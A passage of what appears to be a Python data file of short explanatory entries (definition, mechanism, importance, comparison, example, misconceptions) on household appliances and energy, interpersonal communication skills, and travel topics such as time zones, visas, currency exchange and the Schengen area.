    "vs": "compared with conventional ovens, microwaves don't dry surfaces or brown food (which limits flavor development). Compared with stovetops, microwaves are faster for water-rich foods but lack the precision and direct contact for searing. Best for reheating, defrosting, steaming -- not for searing or baking",
    "ex": "two cups of water at 20C boil in ~3 minutes in a 1000W microwave; on a stovetop in a kettle, ~5-7 minutes. The microwave deposits energy directly into the water; the stovetop heats the kettle, which heats the water. For 1 cup, microwave can be 2-3x faster",
    "mis": "people think microwaves 'cook from the inside out' -- they actually penetrate ~1 inch and heat from there. Larger items still need conduction time to heat the center. Another myth is that microwaves make food radioactive or unsafe; the energy is non-ionizing and stops the moment the magnetron does",
}
T["how a thermostat regulates temperature"] = {
    "what": "a thermostat is a control device that switches a heating or cooling system on and off to maintain a target temperature. Modern thermostats use electronic temperature sensors and microcontrollers; older ones used bimetal strips or mercury bulbs",
    "how": "the sensor reads ambient temperature; control logic compares it to the setpoint. When temperature drifts beyond a deadband (e.g., 1F either side of target), the thermostat closes a relay that powers the heating or cooling equipment. Hysteresis (the deadband) prevents short-cycling on every tiny fluctuation",
    "why": "thermostats are the unsung heroes of residential and commercial energy use. Smart thermostats (Nest, Ecobee) add scheduling, occupancy detection, and learning to cut HVAC energy by 10-20% in typical homes. They are also the entry point for home automation",
    "vs": "compared with manual control, automatic thermostats save energy by avoiding overheating and overcooling. Compared with simple bimetal thermostats, programmable and smart thermostats add schedules, remote control, and occupancy-based adjustments -- meaningful efficiency gains",
    "ex": "a Nest thermostat learns your weekly schedule over a week or two: warmer when you're home in the evening, cooler at night, off during the day when no one's there. Combined with weather-based prediction, it pre-heats efficiently and avoids running while you're away. Typical savings: 10-15% on heating, 15-20% on cooling",
    "mis": "people think cranking the thermostat to 80 will heat the house faster; the heater is on whether you set 70 or 80 -- the higher setting just makes it run longer. Another myth is that turning off the heater when leaving costs more in restart energy than keeping it warm; for trips longer than a few hours, lowering the setpoint always saves",
}
T["how solar panels generate electricity"] = {
    "what": "solar panels (photovoltaic cells) convert sunlight directly into electricity using the photovoltaic effect. Photons knock electrons free from semiconductor atoms; the cell's structure channels these electrons into an external circuit, producing direct current",
    "how": "a typical silicon cell is a sandwich of n-type (extra electrons) and p-type (electron holes) silicon. The junction creates an electric field. Photons absorbed in the silicon energize electrons, which the field pushes into the n-type layer. Wires collect them and route them through an external circuit. An inverter converts the DC to grid-compatible AC",
    "why": "solar PV grew from negligible in 2000 to providing ~6% of global electricity by 2024, with prices dropping 90% over two decades. Rooftop solar empowers households to generate their own power; utility-scale solar farms now produce some of the cheapest electricity in many regions",
    "vs": "compared with concentrated solar power (which uses mirrors to heat fluid for steam turbines), PV has no moving parts and works with diffuse light. Compared with wind, solar is more predictable diurnally and complements wind on the grid. Compared with batteries, solar generates only when the sun shines -- pairing with storage extends usefulness",
    "ex": "a 10 kW residential rooftop array in sunny California generates ~15,000 kWh/year, covering most of a typical home's electricity. Net metering credits exports to the grid at retail rates. Total system cost ~$25K before incentives; payback period typically 7-10 years",
    "mis": "people think solar panels stop working in cold weather; they're actually slightly more efficient at cooler temperatures (silicon efficiency drops with heat). Another myth is that they need bright sun -- they generate even on cloudy days, just at 10-25% of peak. They also work in winter, just with less daylight",
}
T["how a heat pump works"] = {
    "what": "a heat pump is a device that moves heat from one place to another using a vapor-compression cycle, the same principle as a refrigerator. It can heat or cool by reversing the direction of heat transfer. Modern heat pumps achieve efficiencies of 250-400% (heat moved per energy input)",
    "how": "in heating mode, the outdoor unit's evaporator absorbs heat from outside air (even at 20F, ambient air contains usable heat). The compressor concentrates that heat by raising pressure; the indoor condenser releases it inside. A reversing valve flips the cycle for cooling. Refrigerant cycles continuously",
    "why": "heat pumps are central to electrification of heating, replacing fossil-fuel furnaces with electricity that can come from renewable sources. Their efficiency far exceeds resistive electric heating (which is 100% efficient) because they move heat rather than create it. Adoption has surged with rebates and rising fossil-fuel prices",
    "vs": "compared with gas furnaces (~80-95% efficient), heat pumps deliver 2.5-4 units of heat per unit of electricity -- a fundamentally different efficiency story. Compared with traditional AC, modern heat pumps work down to -15F or colder with minimal capacity loss, addressing the historical cold-climate concern",
    "ex": "a cold-climate heat pump in Maine in winter (outdoor temp 10F) might deliver heat at COP 2.5 -- 2.5 units of heat per unit of electricity. A standard electric resistance heater delivers exactly 1.0. With $0.20/kWh electricity, the heat pump costs $0.08/kWh of heat vs $0.20 for resistance",
    "mis": "people think heat pumps don't work in cold climates; modern cold-climate models work efficiently down to -15F or below. Another myth is that they're new technology; they've been mainstream in Europe and Japan for decades, and adoption is finally accelerating in North America",
}
T["water heater types"] = {
    "what": "appliances that heat water for domestic use. Main types: tank storage water heaters (electric, gas, propane), tankless (on-demand) water heaters, heat pump water heaters, and solar water heaters. Each has different efficiency, cost, and capacity tradeoffs",
    "how": "tank heaters store 30-80 gallons of hot water continuously, reheating as it cools. Tankless heaters fire instantly when a tap opens, heating water as it flows through. Heat pump heaters use refrigeration cycles to extract heat from ambient air -- 2-3x more efficient than electric resistance. Solar uses panels to preheat water",
    "why": "water heating is typically 15-20% of home energy use -- second only to space heating/cooling. Choosing efficiently can save hundreds annually. Heat pump water heaters in particular have become eligible for major rebates and tax credits in the 2020s",
    "vs": "tank gas heaters are cheap upfront, modest efficiency. Tankless gas saves on standby losses, lasts longer, but costs more to install. Heat pump water heaters cost more but cut electric water heating energy by 60-70%. Solar can preheat to near 100% in sunny climates with backup for cloudy days",
    "ex": "replacing a 50-gallon electric tank ($600 + ~$700/year to operate) with a heat pump water heater ($1500 + ~$200/year): savings of $500/year, payback in ~2 years if you account for the $1000 federal tax credit. Without the credit, payback is ~4 years",
    "mis": "people think tankless heaters provide unlimited hot water; they have flow rate limits -- one tankless might handle two showers simultaneously but not three. Another myth is that hotter setpoint = better; ~120F is plenty for most uses and reduces scalding risk and energy use. Avoid <115F due to Legionella growth risk",
}
T["septic vs sewer systems"] = {
    "what": "two ways to handle household wastewater. Sewer systems pipe wastewater to centralized municipal treatment plants. Septic systems treat wastewater on-site, using a buried tank where solids settle and a leach field where liquid effluent percolates through soil",
    "how": "in a septic system, wastewater flows into a tank where solids sink (sludge) and grease floats (scum). Anaerobic bacteria partially digest solids. The middle effluent flows out to a distribution box, then through perforated pipes in a gravel-filled leach field, where soil microbes break down remaining contaminants",
    "why": "septic systems serve ~20% of US households, mostly rural. They cost more to install (~$5K-30K) but have no monthly sewer bill. Sewer systems handle high density efficiently but require expensive infrastructure. Failed septic systems can contaminate groundwater and cost tens of thousands to repair or replace",
    "vs": "sewer customers pay monthly utility bills (~$30-100/month typical) and have negligible maintenance responsibility. Septic owners pay nothing monthly but bear maintenance: pumping every 3-5 years (~$300-500), avoiding hard chemicals and excessive water use, and replacing failed components",
    "ex": "a typical 4-person household pumps a 1000-gallon septic tank every 3-5 years. The leach field can last 20-50 years if properly maintained; doing laundry over multiple days rather than all at once prevents flooding. Bleach, antibacterial cleaners, and food disposers shorten system life by killing the digestion bacteria",
    "mis": "people think septic systems are 'less green' than sewer; well-maintained septic actually has lower carbon footprint than long sewer hauls plus treatment plants. Another myth is that septic-safe products clean as well as conventional -- many do; it just takes label-reading and habit shifts",
}
T["circuit breakers vs fuses"] = {
    "what": "two devices that protect electrical circuits from overcurrent. A fuse is a sacrificial element -- a thin wire that melts and breaks the circuit when current exceeds its rating. A circuit breaker is a reusable switch that trips on overcurrent and can be reset by hand",
    "how": "a fuse contains a calibrated metal strip that melts at its rated current. A breaker uses either a thermal element (bimetal strip that bends with heat) or a magnetic element (electromagnet that trips on sudden surge), or both. AFCI and GFCI breakers add electronics for arc-fault and ground-fault detection",
    "why": "overcurrent protection prevents fires from overheated wiring and protects expensive equipment. Modern panels almost universally use breakers because they're convenient -- no replacement, just reset -- and can offer additional protections like AFCI (against arcing) and GFCI (against shock)",
    "vs": "fuses are cheaper, simpler, and faster-acting on extreme overcurrent. Breakers are reusable, easier to identify when tripped, and offer more sophisticated protection. Modern homes use breakers in the panel; fuses persist in some equipment (auto, electronics) where size and speed matter more than convenience",
    "ex": "a 15A bedroom breaker trips when a hair dryer plus a space heater exceed 15A. You unplug one, walk to the panel, flip the breaker fully off then on. With a fuse, you'd need a replacement of the right rating; using a 30A fuse on a 15A circuit is a fire hazard but unfortunately a common mistake",
    "mis": "people think a tripped breaker is broken; it's working as designed. Another myth is that you can resize a breaker to fix nuisance trips -- the breaker matches the wire ampacity. Upsizing without rewiring creates fire risk. The fix is to balance loads or run a new dedicated circuit",
}
T["smoke alarm types"] = {
    "what": "two main detection technologies. Ionization detectors use a small radioactive source (Americium-241) to detect tiny smoke particles -- best for fast-flaming fires. Photoelectric detectors use a light beam scattered by smoke -- best for slow-smoldering fires that produce visible smoke before flames",
    "how": "ionization: a small chamber with a current between two plates is disrupted by smoke particles, triggering the alarm. Photoelectric: an LED beam is angled away from a photo sensor; smoke scatters the beam toward the sensor, triggering. Combination (dual-sensor) alarms include both technologies",
    "why": "smoke alarms cut fire fatality risk by ~60% in homes that have working alarms. Despite this, many fatal fires occur in homes with no alarms or dead batteries. Modern code increasingly requires interconnected alarms in every bedroom and on every floor",
    "vs": "ionization alarms respond faster to flaming fires (paper, gasoline) but slower to smoldering ones (smoldering upholstery, electrical). Photoelectric is the reverse. Combination alarms cover both. The NFPA recommends both technologies in every home -- typically combination units in every bedroom",
    "ex": "modern interconnected alarms: when one detects smoke, all sound throughout the house. A bedroom photoelectric alarm catches a smoldering mattress fire that an ionization alarm in the kitchen wouldn't have detected. Battery alarms last 5-10 years and need annual battery replacement (or sealed lithium models lasting 10 years)",
    "mis": "people think smoke alarms last forever; sensors degrade over 10 years and the unit should be replaced. Another myth is that ionization alarms are dangerous due to radioactive material; the source is safely sealed and the radiation levels are far below background",
}
T["composting basics"] = {
    "what": "controlled decomposition of organic waste -- food scraps, yard debris -- into a nutrient-rich soil amendment by microbes, fungi, and macro-organisms. Backyard composting diverts kitchen waste from landfills (where it would generate methane) and creates a valuable garden input",
    "how": "successful composting balances 'browns' (carbon: dry leaves, cardboard) and 'greens' (nitrogen: kitchen scraps, grass) at roughly 3:1 by volume. Add water to keep moist, turn periodically to add oxygen. Microbes generate heat as they decompose; well-managed piles reach 130-160F, killing weed seeds and pathogens",
    "why": "household organics make up ~30% of US municipal waste. Composting reduces methane emissions from landfills and produces a valuable amendment for gardens. The EPA estimates composting reduces a household's carbon footprint by hundreds of pounds of CO2 equivalent annually",
    "vs": "hot composting (turned, balanced piles) finishes in 1-3 months and reaches sanitizing temperatures. Cold composting (just pile it) takes 6-12+ months but requires no maintenance. Worm composting (vermicomposting) suits indoor or small spaces. Bokashi ferments food including meat and dairy, then buries it",
    "ex": "a 3' x 3' x 3' bin in the corner of a yard: layer dry leaves and grass clippings with vegetable peels, coffee grounds, eggshells. Turn weekly with a fork. After 2-3 months you have dark crumbly compost smelling of earth. A typical household yields ~200-400 pounds of compost annually",
    "mis": "people think composting smells bad; well-managed piles smell like forest floor. Bad smells indicate too much green (nitrogen, anaerobic) or too wet -- add browns and turn. Another myth is that you need a yard to compost; bokashi and worm bins work in apartments",
}
T["LED vs incandescent vs fluorescent lighting"] = {
    "what": "three lighting technologies. Incandescent bulbs heat a tungsten filament until it glows; ~10% of energy becomes light. Fluorescent tubes excite mercury vapor that emits UV, which fluoresces a phosphor coating. LEDs use semiconductor diodes that emit light directly when current flows",
    "how": "incandescent: filament resistance heats it to ~2700K, emitting black-body radiation -- mostly infrared (heat). Fluorescent: electrons strike mercury atoms, exciting electrons that emit UV photons, which strike phosphors emitting visible light. LED: electrons recombining with holes in a semiconductor junction emit photons of specific wavelengths determined by the band gap",
    "why": "LED dropped lighting energy use ~80%, reduced heat output dramatically, and lasted 25,000-50,000 hours vs ~1,000 for incandescent. The transition has eliminated millions of tons of CO2 emissions globally. Many countries banned incandescent sales in the 2010s-2020s",
    "vs": "incandescent: cheap, warm light, terrible efficiency, short life, lots of heat. Fluorescent: efficient, cool to warm light, long life, contains mercury, slow startup, doesn't dim well. LED: most efficient, longest life, instant on, dimmable, full color range, mercury-free, slightly higher upfront cost (now under $1/bulb)",
    "ex": "replacing a 60W incandescent with a 9W LED of equivalent brightness saves ~$10/year per fixture at 3 hours/day and $0.15/kWh. Multiplied across a typical home's 20-40 bulbs, that's $200-400/year saved indefinitely. The LED also generates much less heat, slightly reducing AC load in summer",
    "mis": "people think LEDs feel 'cold' or 'harsh'; modern warm-white LEDs (2700K-3000K) match incandescent color temperature precisely. Another myth is that LED lifespan estimates are marketing -- in practice, well-made LEDs do last 15-25 years, while cheap ones can fail much sooner due to bad drivers or heat dissipation",
}

# === EVERYDAY_LIFE: communication ===
T["active listening"] = {
    "what": "a communication technique that involves fully concentrating on the speaker, understanding their message, responding thoughtfully, and remembering what was said. It contrasts with passive hearing or waiting for your turn to speak",
    "how": "active listening combines several behaviors: maintaining eye contact, putting away distractions, paraphrasing back what you heard ('so what I'm hearing is...'), asking clarifying questions, withholding judgment, and reading nonverbal cues. The listener's goal is understanding before evaluating",
    "why": "active listening builds trust, defuses conflict, and produces better decisions. It's foundational to effective management, customer service, therapy, and personal relationships. Studies in leadership consistently rank listening among the most predictive skills of effectiveness",
    "vs": "compared with passive listening (hearing words without engagement), active listening verifies understanding and signals respect. Compared with reflective listening (a therapeutic technique focused on emotion), active listening covers content and emotion both, and is general-purpose",
    "ex": "in a heated conversation with a colleague: rather than defending immediately, you say 'It sounds like you felt undermined when I made that decision without checking with you. Is that right?' The colleague feels heard, lowers their defensiveness, and the conversation can move toward resolution rather than escalation",
    "mis": "people think active listening means staying silent; it includes brief verbal acknowledgments, paraphrasing, and questions. Another myth is that it's just for therapists -- it's a learnable skill that improves nearly every professional and personal interaction",
}
T["nonverbal communication"] = {
    "what": "the transmission of meaning through cues other than words: facial expressions, gestures, posture, eye contact, tone of voice, proximity, and timing. Estimates suggest a substantial portion of meaning in face-to-face interaction comes from nonverbal channels, especially for emotion",
    "how": "humans process facial expressions and tone preconsciously, often within milliseconds. Cultures share some universal expressions (anger, fear, joy, surprise, sadness, disgust) but vary widely in display rules, eye contact norms, gesture meanings, and personal space expectations",
    "why": "nonverbal cues often signal emotional state, intent, and confidence more reliably than words. Skilled communicators monitor and adjust their own nonverbal signals and read others' to navigate interactions effectively -- crucial in negotiation, leadership, sales, and intimacy",
    "vs": "compared with verbal communication, nonverbal is harder to consciously control and often leaks true feelings. Compared with text-based communication, in-person interaction includes far richer nonverbal context, which is why misunderstandings are more common over email and Slack",
    "ex": "a job candidate says 'I'm excited about this role' while crossing arms, avoiding eye contact, and speaking softly. The interviewer reads conflict between words and nonverbals, lowering trust. The same words with leaning forward, sustained eye contact, and animated tone signal congruent enthusiasm",
    "mis": "people overgeneralize the '93% of communication is nonverbal' claim; that figure is from Mehrabian's specific research on incongruent emotional messages, not all communication. Another myth is that crossed arms always mean defensiveness -- people also cross arms when cold, comfortable, or thoughtful",
}
T["the difference between assertive and aggressive communication"] = {
    "what": "assertive communication expresses your own needs, opinions, and boundaries clearly while respecting others. Aggressive communication asserts your position by attacking, dismissing, or dominating others. Both are direct; the difference is whether the other person's perspective is also respected",
    "how": "assertive uses 'I' statements ('I'd prefer to discuss this tomorrow'), maintains calm tone, and offers alternatives. Aggressive uses 'you' attacks ('you always interrupt'), raises voice, and dismisses counterpoints. Passive communication, by contrast, suppresses your needs to avoid conflict; passive-aggressive expresses hostility indirectly",
    "why": "assertive communication produces better outcomes in negotiation, leadership, and personal relationships. It builds trust and respect over time. Aggressive communication may win short-term battles but damages relationships, escalates conflict, and erodes psychological safety on teams",
    "vs": "passive: I lose, you win. Aggressive: I win, you lose. Assertive: we both win, or at least both feel respected. Passive-aggressive: superficially passive but with hidden aggression, often the worst of both. Most people default to one style under stress; assertiveness is a learned skill",
    "ex": "a coworker keeps missing deadlines that affect your work. Aggressive: 'You're so unreliable. This is the third time you've screwed me over.' Assertive: 'When deadlines slip, I can't deliver on my commitments. Can we talk about what's making this hard and how to prevent it next time?' Same problem, different relationship outcome",
    "mis": "people think being nice and being assertive are opposites; you can be warm AND clear about your needs. Another myth is that women being assertive is automatically perceived as aggressive -- there is real bias, but evidence-based assertiveness training helps women navigate it without losing effectiveness",
}
T["giving constructive feedback"] = {
    "what": "feedback that aims to help the recipient improve, delivered specifically, timely, and respectfully. Constructive feedback focuses on observable behavior and impact rather than character, and offers a path forward",
    "how": "common frameworks include SBI (Situation, Behavior, Impact: 'In yesterday's meeting, when you interrupted three times, the discussion lost focus') and the feedback sandwich (positive, negative, positive -- though research suggests it can dilute the message). Effective feedback is specific, behavioral, and actionable",
    "why": "feedback drives growth in nearly every domain -- work, sports, education, relationships. Without it, blind spots persist and skills plateau. The single biggest predictor of high-performing teams (per Google's Project Aristotle and others) is psychological safety, which depends on the ability to give and receive feedback well",
    "vs": "compared with criticism (which evaluates worth), feedback describes behavior and impact. Compared with praise alone, feedback gives developmental signal. Compared with passive observation, feedback shortens learning loops dramatically -- which is why coaching and 360-reviews are core leadership tools",
    "ex": "instead of 'your presentation was bad', say 'when you spent 5 minutes on the third slide, the audience seemed to lose attention -- I noticed people checking phones. Maybe trim to 90 seconds and put the details in an appendix?' Specific, observable, with a path forward",
    "mis": "people think feedback should be saved up for performance reviews; in reality, immediate feedback while events are fresh is far more useful. Another myth is that the sandwich technique is best -- modern research suggests it can dilute the negative message and make positives feel insincere",
}
T["public speaking fundamentals"] = {
    "what": "the skill of communicating effectively to an audience. Fundamentals include preparation, structure, vocal delivery, body language, audience awareness, and managing nerves. Like any skill, it improves with deliberate practice and feedback",
    "how": "prepare by knowing your audience and goal, structuring content (open with a hook, three main points, close with a call to action), and rehearsing aloud. Deliver with strong vocal variety (volume, pace, pause), eye contact, purposeful gestures, and managing your nerves through breathing and physical preparation",
    "why": "public speaking is one of the most valuable professional skills, repeatedly cited as a top predictor of career advancement. It's also one of people's most common fears (often surveyed as more feared than death). The combination makes it high-leverage to develop",
    "vs": "compared with conversation, public speaking requires more structure, projection, and intentionality. Compared with written communication, it adds vocal and physical channels and demands real-time adaptation to audience. Both presentation and conversation reinforce each other -- skill in one helps the other",
    "ex": "a typical 10-minute talk: open with a compelling story or surprising statistic (60-90 seconds), state the central message, deliver three main points each with an example or data point (~2 minutes each), close by reconnecting to the opening and giving a clear takeaway. Rehearse twice aloud; record yourself once",
    "mis": "people think they need to memorize every word; over-memorization makes you sound robotic and crashes if you lose your place. Use a flexible outline, internalize the key transitions, and trust yourself to fill in the rest. Another myth is that nerves should disappear -- experienced speakers still feel them, they just channel them",
}
T["persuasion techniques"] = {
    "what": "deliberate methods for changing beliefs, attitudes, or behaviors. Robert Cialdini's classic six principles -- reciprocity, commitment/consistency, social proof, authority, liking, scarcity -- have been refined and supplemented by decades of psychology and behavioral economics",
    "how": "effective persuasion combines logic (logos), credibility (ethos), and emotion (pathos). Tailor message to audience (familiar values, relevant stakes), use evidence and stories, make the desired action concrete and easy, anticipate objections, and leverage timing. Ethical persuasion respects the audience's autonomy",
    "why": "persuasion drives every domain involving people -- sales, leadership, parenting, public health, civic engagement, intimate relationships. Strong persuasion skills compound over a career. Understanding persuasion also helps you recognize when others use it on you, including in advertising, politics, and scams",
    "vs": "compared with manipulation (covert, exploits cognitive biases against the target's interest), persuasion is overt and aims for mutual benefit. Compared with coercion (force), persuasion respects autonomy. Compared with information transfer alone, persuasion explicitly aims to change beliefs or actions",
    "ex": "asking a busy colleague for a favor: priming with reciprocity ('I covered your meeting last week, and I'd appreciate'), commitment ('would you be willing to look this over once?'), and concrete request with a small first step ('just the executive summary first') beats a vague open-ended ask",
    "mis": "people think persuasion is one-shot; the strongest persuasion is built through trust over time, which is why long-term relationships beat clever pitches. Another myth is that facts alone persuade -- people change minds when emotion, identity, and social context align with the new belief, not from data alone",
}
T["conflict resolution"] = {
    "what": "structured approaches for resolving disputes between parties with conflicting interests, goals, or perceptions. Approaches range from informal conversation to formal mediation, arbitration, and adjudication. Most workplace and personal conflicts can be resolved with a few well-chosen techniques",
    "how": "core moves include separating people from the problem, focusing on interests not positions, generating multiple options before choosing, and using objective criteria to evaluate. Active listening, naming emotions, and acknowledging the other side's view defuse defensiveness. Mediators add structure when parties can't talk directly",
    "why": "unresolved conflict damages relationships, decisions, and productivity. Effective conflict resolution preserves relationships while addressing substantive issues, and often produces better outcomes than either party's initial position because it surfaces underlying interests",
    "vs": "competitive negotiation (win-lose) extracts maximum from one deal but damages future trust. Collaborative resolution (win-win) seeks integrative solutions and preserves relationships. Avoidance (postponing the issue) sometimes works for trivial matters but allows real conflicts to fester",
    "ex": "two team members disagree on architecture. Surface their underlying interests: one wants reliability (interest), the other wants speed of iteration (interest). Generate options: feature flags allow fast iteration with safety, automated tests speed development without sacrificing reliability. They converge on a hybrid",
    "mis": "people think conflict is bad; productive conflict over ideas (vs personal attack) drives better decisions. Another myth is that conflict resolution means everyone gets exactly what they want -- it means a workable agreement that respects all parties' core interests",
}
T["cross-cultural communication"] = {
    "what": "communication between people from different cultural backgrounds, navigating differences in language, norms, values, and communication styles. Includes both explicit content and the implicit conventions about how to interact, how directly to speak, and what hierarchies to respect",
    "how": "effective cross-cultural communicators learn key dimensions: high vs low context (East Asia vs North America), direct vs indirect speech, monochronic vs polychronic time, individualism vs collectivism, hierarchy vs egalitarianism. They listen carefully, ask rather than assume, and check understanding more often",
    "why": "globalization, remote work, and immigration mean most professionals communicate across cultures regularly. Cultural mismatches cause failed deals, broken teams, and personal friction. Skills here are learnable and have outsized impact on multinational careers",
    "vs": "low-context cultures (US, Germany, Scandinavia) prize explicit verbal communication. High-context cultures (Japan, China, Arab countries) rely heavily on shared understanding, nonverbal cues, and implication. A direct American 'I disagree' may feel hostile in Japanese settings; a Japanese 'I'll consider it' may mean 'no' but sound like 'maybe' to Americans",
    "ex": "a US team gives crisp feedback to Japanese colleagues: 'this design has three problems'. The Japanese team perceives loss of face and disengages. Reframing: 'I see the strengths here. May I share some questions for discussion?' delivers the same content with cultural calibration that preserves the working relationship",
    "mis": "people think cultural awareness is just learning country-by-country rules; the deeper skill is meta-cultural awareness -- noticing when things feel off and inquiring rather than assuming. Another myth is that English fluency makes culture irrelevant; communication norms persist even in shared language",
}

# === EVERYDAY_LIFE: travel/geography ===
T["time zones and the international date line"] = {
    "what": "the world is divided into 24 standard time zones, each ~15 degrees of longitude wide, with all clocks within a zone set the same. The International Date Line runs roughly along the 180th meridian; crossing it changes the calendar date but not the time of day",
    "how": "each zone is offset from UTC (Coordinated Universal Time) by a whole number of hours, with some half-hour and quarter-hour exceptions (India is UTC+5:30, Nepal is UTC+5:45). Daylight saving time shifts clocks forward an hour in summer in many regions. The date line zigzags around political boundaries to keep countries on a single date",
    "why": "time zones enable globally coordinated activities -- flights, financial markets, software releases. Without them, every city would have its own solar time, complicating long-distance scheduling. The IDL handles the discontinuity that arises when going around the globe gains or loses a day",
    "vs": "before standard time zones (1880s for US/Canada railroads), every town set noon to local solar transit -- chaotic for railways. Modern time zones provide an arbitrary but useful coordination. Some scientists and IT systems use UTC continuously to avoid time-zone confusion entirely",
    "ex": "flying from Tokyo to LA: depart 6 PM Monday, fly 10 hours, arrive 11 AM Monday -- you 'gain' a day crossing the IDL eastbound. Reverse direction: depart LA 12 PM Monday, fly 11 hours, arrive 4 PM Tuesday -- you lose a day. Same flight times, opposite calendar effects",
    "mis": "people think the IDL is a straight line; it zigzags significantly to keep entire countries on one date (Kiribati notably moved itself across the line in 1995). Another myth is that time zones are equally wide; political boundaries and DST policies create irregular zones, and China spans 5 solar zones but uses a single time",
}
T["jet lag"] = {
    "what": "a temporary physiological mismatch between your circadian rhythm and the local time after rapid travel across multiple time zones. Symptoms include fatigue at the wrong times, sleep disturbance, digestive issues, and mood disruption. It typically takes one day per time zone to fully adjust",
    "how": "your circadian rhythm is regulated by the suprachiasmatic nucleus, synchronized primarily by light exposure. Rapid time-zone shifts leave the SCN signaling the old time while local cues (light, meals, social activity) signal the new time. The mismatch disrupts sleep, hormones (cortisol, melatonin), and digestion",
    "why": "jet lag impairs cognition, mood, and performance for days after long flights, costing business travelers and athletes meaningful productivity. Sleep researchers have developed evidence-based mitigation strategies; airlines and ride-sharing apps now offer jet-lag tools",
    "vs": "eastward travel (advancing your clock) is generally harder than westward travel (delaying your clock) because your endogenous rhythm is slightly longer than 24 hours -- it's easier to lengthen than shorten. Time zones crossed matter more than total flight time",
    "ex": "flying NY to London (5 hours east): bedtime in London is your 6 PM, wakeup is your 1 AM. Mitigation: shift bedtime 1-2 hours earlier 2-3 days before; on landing morning, get bright sunlight for 30+ minutes, avoid afternoon naps, eat meals on local schedule. Adjusted within 3-4 days vs 5-6 without strategy",
    "mis": "people think alcohol on a flight helps sleep; it disrupts REM and worsens dehydration, both of which compound jet lag. Another myth is that you can prevent jet lag with melatonin -- it helps shift the rhythm by an hour or so per day at small doses (0.3-0.5mg) but doesn't eliminate the lag",
}
T["passport vs visa requirements"] = {
    "what": "a passport is a government-issued travel document that proves your citizenship and identity. A visa is permission from a destination country to enter, often stamped or affixed in your passport. You typically need both for international travel; the specific visa requirements depend on your nationality and the destination",
    "how": "passports are issued by your country of citizenship and accepted globally. Visas are issued by the destination country, either in advance (apply at embassy or online) or on arrival. Visa-free agreements (Schengen, ESTA, eTA) let citizens of certain countries enter without a traditional visa for short stays",
    "why": "passports prove who you are; visas regulate who may enter and how long they may stay. The combination governs border movement globally. The 'passport power' rankings reflect how many countries you can enter visa-free with each nationality -- ranging from 30+ for some passports to 190+ for the strongest",
    "vs": "compared with national IDs (which work for domestic travel), passports work internationally. Compared with residence permits (which authorize long-term stay), visas typically authorize specific shorter visits with defined purposes (tourist, business, transit)",
    "ex": "a US passport holder visiting France: passport for ID and citizenship, no visa needed for stays under 90 days under Schengen; ETIAS authorization required from 2025+. Same person visiting China: needs both passport and pre-arranged tourist visa. Same person visiting Mexico: passport only, with FMM tourist permit issued at entry",
    "mis": "people think 'visa-free' means 'no permit'; many visa-free destinations require pre-travel authorization (ESTA for US, ETA for Canada/Australia, ETIAS for Europe from 2025). Another myth is that you can enter on a tourist visa to work -- many visa categories prohibit specific activities, and violations can produce long bans",
}
T["currency exchange and forex spreads"] = {
    "what": "the foreign exchange market trades trillions of dollars daily, setting exchange rates between currencies. The 'spread' is the difference between the buy and sell rates -- the markup that exchange providers take. Spreads vary widely between providers: 0-1% for wholesale, up to 10%+ for airport kiosks",
    "how": "the underlying mid-market rate is set by the global forex market in real time. Exchange providers add a spread above (when they sell to you) and below (when they buy from you). Credit card networks typically spread 0-1% above mid-market; ATM withdrawals from major banks 1-3%; airport currency exchanges 5-10%",
    "why": "exchange costs add up quickly on travel and international purchases. A $5,000 trip exchanged at airport kiosks costs ~$400 more than the same amount via a no-foreign-fee card. Understanding spreads lets you choose the cheapest method for each transaction type",
    "vs": "credit cards from issuers without foreign transaction fees (Capital One, Chase Sapphire, Charles Schwab debit) charge 0% above the network's wholesale rate -- the cheapest method for most travelers. Airport currency exchanges are the most expensive. Wise (formerly TransferWise) and Revolut offer near-mid-market rates for transfers and prepaid cards",
    "ex": "withdrawing $300 in pesos from a Mexico airport ATM with a Schwab debit card: ~0.5% above mid-market plus refunded ATM fee, so ~$1.50 cost. Same withdrawal from a non-bank ATM: 5-7% spread plus $5 ATM fee = ~$25. Same amount via airport currency kiosk: ~$30 cost. Method matters",
    "mis": "people think 'no fee' currency exchange is free; the spread IS the fee. Another myth is that paying in your home currency at a foreign POS terminal saves money; dynamic currency conversion adds 3-7% above what your card's network would charge",
}
T["the Schengen area"] = {
    "what": "a zone of 29 European countries (as of 2026) that have abolished internal border controls, allowing free movement across them with a single visa or visa-free entry. It includes most EU members plus Iceland, Norway, Switzerland, Liechtenstein, and recent additions like Romania and Bulgaria",
    "how": "you enter the Schengen area at any external border with one passport check and one visa. Internal travel between Schengen countries is borderless -- no passport check at airports, trains, or roads. Common 90-day-in-180-day rule applies to non-EU visitors. From 2025+, ETIAS pre-authorization replaces visa-free entry for most non-EU visitors",
    "why": "Schengen made cross-border travel within Europe as easy as moving between US states, transforming European tourism, business, and integration. ~1.7 million people commute across Schengen borders daily. Reinstating internal borders during crises (migration 2015, COVID 2020) caused major disruption",
    "vs": "compared with the EU (a political union), Schengen is a movement agreement; the two memberships overlap mostly but not entirely (Ireland is EU but not Schengen; Norway is Schengen but not EU). Compared with simple visa waivers, Schengen is reciprocal and shares a common visa policy",
    "ex": "a US tourist with no visa flies into Paris (Schengen entry, passport stamped), trains to Amsterdam (no border check), drives to Berlin (no border check), flies home from Munich (Schengen exit, passport stamped). 90-day clock counted across all visits to all Schengen states",
    "mis": "people think the EU and Schengen are the same; they overlap heavily but are distinct -- Ireland is in the EU but not Schengen, and Norway and Switzerland are in Schengen but not the EU. Another myth is that the 90-day allowance refreshes per country; it counts across all Schengen states cumulatively",
}
T["travel insurance"] = {
    "what": "insurance that covers risks specific to travel: trip cancellation, medical emergencies abroad, evacuation, baggage loss, and travel delays. Policies range from minimal coverage included with credit cards to comprehensive standalone plans with high medical limits",
    "how": "you buy a policy before traveling, paying a premium based on age, destination, trip cost, and coverage level. Claims are filed with documentation (receipts, medical records, police reports for theft). Coverage varies dramatically -- read the policy for exclusions like pre-existing conditions, adventure activities, and pandemic-related claims",
    "why": "medical care abroad can cost tens of thousands without insurance, and US health insurance often doesn't cover international care. Evacuation alone (medevac flight home) can cost $50K-200K. For expensive or remote trips, travel insurance is one of the highest-value purchases per dollar premium",
    "vs": "credit-card travel benefits often cover trip delays, lost baggage, and rental car CDW but typically little or no medical coverage. Standalone travel medical (a few dollars per day) covers gaps. Comprehensive plans bundle cancellation, medical, and evacuation. Annual policies are economical for frequent travelers",
